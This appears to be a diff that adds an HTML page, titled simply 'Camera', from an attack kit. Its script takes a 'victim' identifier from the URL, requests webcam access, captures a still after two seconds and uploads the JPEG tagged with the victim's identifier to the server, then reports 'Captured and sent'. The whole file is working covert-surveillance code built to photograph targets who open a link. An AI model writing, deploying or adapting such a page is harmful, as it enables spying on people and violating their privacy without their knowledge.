@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera</title>
+</head>
+<body>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const victim = params.get('victim');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          stream.getTracks().forEach(track => track.stop());
+
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('file', blob, 'capture.jpg');
+            formData.append('victim', victim);
+
+            fetch('/upload/camera', {
+              method: 'POST',
+              body: formData
+            }).then(() => {
+              alert('Captured and sent');
+            });
+          }, 'image/jpeg');
+        }, 2000);
+      });
+  </script>
+</body>
+</html>
